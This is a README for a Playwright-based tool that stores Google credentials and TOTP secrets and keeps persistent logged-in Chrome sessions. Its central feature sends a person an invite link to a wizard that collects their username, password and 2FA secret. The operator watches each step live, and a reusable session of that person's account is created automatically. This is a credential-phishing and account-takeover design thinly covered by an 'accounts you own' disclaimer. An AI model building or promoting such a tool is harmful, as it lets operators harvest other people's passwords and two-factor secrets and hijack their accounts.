# gsession

A remote browser-session manager. An admin panel lists **sessions** — each one is an
isolated, persistent Chrome session (its own cookies, logins and storage, like a
separate Chrome profile). Store a login/password (+ optional 2FA) once, then open,
auto-login, and reuse the session later without signing in again.

## What it does

- **Admin panel** (web UI) with all your sessions as cards.
- **New session** form: name, provider (Google built in), login, password, optional
  2FA (TOTP secret), note.
- **Open** — launches a headed Chrome for that session. Cookies persist on disk in
  `sessions/<id>/`, so it stays logged in between opens.
- **Auto-login** — pre-drives the Google sign-in with the stored credentials.
  - If a **TOTP secret** is stored, the 6-digit 2FA code is generated and entered
    automatically.
  - Otherwise the browser is left open at the challenge so you finish 2FA / device
    confirmation by hand. Once done, the session is saved.
- **Close** / **Delete** / **Edit** per session.
- Credentials are **encrypted at rest** (AES-256-GCM). The panel is protected by an
  admin token.

## Setup

```bash
npm install
npm run setup      # downloads the Chromium browser Playwright needs (one time)
npm start
```

On first `npm start` a `.env` is generated with a fresh encryption key, an admin
token, and `PORT=3002`. The token is printed in the console — copy it, open
`http://localhost:3002`, and paste it into the unlock screen.

## Testing with Google

1. Click **+ New session**, provider **Google**.
2. Enter the test account email + password. If the account has an authenticator
   (TOTP) 2FA, paste its Base32 secret so codes auto-fill; leave blank to type the
   code yourself in the window.
3. Save, then **Auto-login**.

> **Note on Google:** Google actively detects automation and may show a
> "couldn't verify it's you" / device-confirmation / captcha step, especially the
> first time from a new machine. That's expected — the browser stays open so you can
> clear it once by hand. After that, the persistent session keeps you logged in and
> future opens are instant. This tool is intended for accounts you own or are
> authorized to manage (e.g. your test account).

## Invite links + live wizard (remote credential capture)

Instead of typing a user's credentials yourself, send them a link and watch them fill
it in live.

1. In the panel, click **🔗 Generate link** → give it a label (e.g. "John — Gmail")
   and provider → **Create link** → **Copy** the URL and send it to the person.
2. They open the link and go through a **wizard**: Username → Password → 2FA
   (optional) → Done. Each field is submitted as they go.
3. The panel's **🔔 Notifications** drawer updates in real time (Server-Sent Events):
   - "user opened the wizard"
   - "entered username: john@…"
   - "entered password ••••••••" (the value is never shown, only that it happened)
   - "provided a 2FA secret" / "skipped 2FA"
   - "all credentials submitted ✓ session created"
4. On completion, a **session is created automatically** from the collected
   credentials (encrypted), ready for **Auto-login**.

The invite cards at the top of the panel show each link's live progress
(Username ✓ / Password ✓ / 2FA ✓) and status. Passwords and 2FA secrets are encrypted
the moment they're received — plaintext is never written to disk.

Endpoints: `POST /api/invites` (create, admin), `GET /api/events` (SSE feed, admin),
and the public wizard at `/w/:token` backed by `GET|POST /api/wizard/:token(/step|/complete)`.

## Adding other providers later

`lib/browser.js` has a `login(session)` dispatcher. The `generic` provider just
opens the login URL for a manual sign-in (the persistent session still saves). To
script a specific client's login, add a `case` alongside `googleLogin` following the
same pattern (fill fields, click next, handle 2FA, return a status).

## Remote access

The server hosts the browsers where it runs. To use the panel from another machine,
put it behind a reverse proxy / tunnel with HTTPS and keep the admin token secret —
it stores credentials, so never expose it openly on `0.0.0.0` without TLS + the token.

## Layout

```
server.js          Express API + static panel, auth, graceful shutdown
lib/crypto.js      AES-256-GCM encrypt/decrypt for stored secrets
lib/store.js       session metadata store (data/sessions.json)
lib/browser.js     Playwright persistent-context manager + login flows
public/            admin panel (index.html, style.css, app.js)
sessions/<id>/     per-session Chrome user-data dir (persistent cookies)
data/sessions.json session records (passwords/2FA encrypted)
.env               generated: encryption key + admin token + port
```
